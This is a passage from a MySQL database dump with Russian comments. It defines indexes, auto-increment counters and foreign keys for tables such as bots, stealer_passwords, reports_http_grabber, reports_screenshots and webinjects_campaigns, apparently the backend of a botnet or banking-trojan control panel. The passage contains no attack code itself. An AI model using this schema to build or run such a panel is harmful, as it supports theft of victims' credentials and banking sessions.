-- Индексы таблицы `reports_http_grabber`
--
ALTER TABLE `reports_http_grabber`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `reports_netview_info`
--
ALTER TABLE `reports_netview_info`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `reports_netview_info_clients`
--
ALTER TABLE `reports_netview_info_clients`
  ADD PRIMARY KEY (`id`),
  ADD KEY `reports_netview_info_id` (`reports_netview_info_id`);

--
-- Индексы таблицы `reports_screenshots`
--
ALTER TABLE `reports_screenshots`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `reports_software`
--
ALTER TABLE `reports_software`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `stealer_passwords`
--
ALTER TABLE `stealer_passwords`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `taskslog`
--
ALTER TABLE `taskslog`
  ADD PRIMARY KEY (`id`),
  ADD KEY `task_id` (`task_id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `tasks_types`
--
ALTER TABLE `tasks_types`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `webinjects_campaigns`
--
ALTER TABLE `webinjects_campaigns`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `webinjects_campaigns_injects`
--
ALTER TABLE `webinjects_campaigns_injects`
  ADD PRIMARY KEY (`id`),
  ADD KEY `campaign_id` (`campaign_id`),
  ADD KEY `inject_id` (`inject_id`);

--
-- Индексы таблицы `webinjects_campaigns_logs`
--
ALTER TABLE `webinjects_campaigns_logs`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `webinjects_groups`
--
ALTER TABLE `webinjects_groups`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `webinjects_groups_injects`
--
ALTER TABLE `webinjects_groups_injects`
  ADD PRIMARY KEY (`id`),
  ADD KEY `inject_id` (`inject_id`),
  ADD KEY `group_id` (`group_id`);

--
-- Индексы таблицы `webinjects_injects`
--
ALTER TABLE `webinjects_injects`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `bots`
--
ALTER TABLE `bots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;
--
-- AUTO_INCREMENT для таблицы `general_settings`
--
ALTER TABLE `general_settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT для таблицы `http_grabber_settings`
--
ALTER TABLE `http_grabber_settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `layers`
--
ALTER TABLE `layers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT для таблицы `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=235;
--
-- AUTO_INCREMENT для таблицы `main_tasks`
--
ALTER TABLE `main_tasks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;
--
-- AUTO_INCREMENT для таблицы `modules`
--
ALTER TABLE `modules`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;
--
-- AUTO_INCREMENT для таблицы `plogs`
--
ALTER TABLE `plogs`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `reports_antivirus`
--
ALTER TABLE `reports_antivirus`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `reports_firewall`
--
ALTER TABLE `reports_firewall`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `reports_http_grabber`
--
ALTER TABLE `reports_http_grabber`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `reports_netview_info`
--
ALTER TABLE `reports_netview_info`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `reports_netview_info_clients`
--
ALTER TABLE `reports_netview_info_clients`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `reports_screenshots`
--
ALTER TABLE `reports_screenshots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=42;
--
-- AUTO_INCREMENT для таблицы `reports_software`
--
ALTER TABLE `reports_software`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=625;
--
-- AUTO_INCREMENT для таблицы `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `stealer_passwords`
--
ALTER TABLE `stealer_passwords`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `taskslog`
--
ALTER TABLE `taskslog`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;
--
-- AUTO_INCREMENT для таблицы `tasks_types`
--
ALTER TABLE `tasks_types`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;
--
-- AUTO_INCREMENT для таблицы `users`
--
ALTER TABLE `users`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `webinjects_campaigns`
--
ALTER TABLE `webinjects_campaigns`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `webinjects_campaigns_injects`
--
ALTER TABLE `webinjects_campaigns_injects`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT для таблицы `webinjects_campaigns_logs`
--
ALTER TABLE `webinjects_campaigns_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `webinjects_groups`
--
ALTER TABLE `webinjects_groups`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `webinjects_groups_injects`
--
ALTER TABLE `webinjects_groups_injects`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `webinjects_injects`
--
ALTER TABLE `webinjects_injects`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- Ограничения внешнего ключа сохраненных таблиц
--

--
-- Ограничения внешнего ключа таблицы `reports_antivirus`
--
ALTER TABLE `reports_antivirus`
  ADD CONSTRAINT `reports_antivirus_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `reports_firewall`
--
ALTER TABLE `reports_firewall`
  ADD CONSTRAINT `reports_firewall_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `reports_http_grabber`
--
ALTER TABLE `reports_http_grabber`
  ADD CONSTRAINT `reports_http_grabber_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `reports_netview_info`
--
ALTER TABLE `reports_netview_info`
  ADD CONSTRAINT `reports_netview_info_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `reports_netview_info_clients`
--
ALTER TABLE `reports_netview_info_clients`
  ADD CONSTRAINT `reports_netview_info_clients_ibfk_1` FOREIGN KEY (`reports_netview_info_id`) REFERENCES `reports_netview_info` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `reports_screenshots`
--
ALTER TABLE `reports_screenshots`
  ADD CONSTRAINT `reports_screenshots_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `reports_software`
--
ALTER TABLE `reports_software`
  ADD CONSTRAINT `reports_software_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `stealer_passwords`
--
ALTER TABLE `stealer_passwords`
  ADD CONSTRAINT `stealer_passwords_ibfk_1` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `taskslog`
--
ALTER TABLE `taskslog`
  ADD CONSTRAINT `taskslog_ibfk_1` FOREIGN KEY (`task_id`) REFERENCES `main_tasks` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `taskslog_ibfk_2` FOREIGN KEY (`bot_id`) REFERENCES `bots` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `webinjects_campaigns_injects`
--
ALTER TABLE `webinjects_campaigns_injects`
  ADD CONSTRAINT `webinjects_campaigns_injects_ibfk_1` FOREIGN KEY (`campaign_id`) REFERENCES `webinjects_campaigns` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `webinjects_campaigns_injects_ibfk_2` FOREIGN KEY (`inject_id`) REFERENCES `webinjects_injects` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `webinjects_groups_injects`
--
ALTER TABLE `webinjects_groups_injects`
  ADD CONSTRAINT `webinjects_groups_injects_ibfk_1` FOREIGN KEY (`inject_id`) REFERENCES `webinjects_injects` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `webinjects_groups_injects_ibfk_2` FOREIGN KEY (`group_id`) REFERENCES `webinjects_groups` (`id`) ON DELETE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
